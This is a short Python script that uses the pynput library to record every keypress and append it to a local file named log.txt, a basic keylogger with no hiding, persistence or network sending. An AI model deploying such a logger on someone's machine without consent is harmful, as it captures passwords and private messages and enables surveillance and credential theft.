from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        # Special keys (e.g., shift, ctrl) don't have 'char'
        with open("log.txt", "a") as log_file:
            log_file.write(f"{key}\n")

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()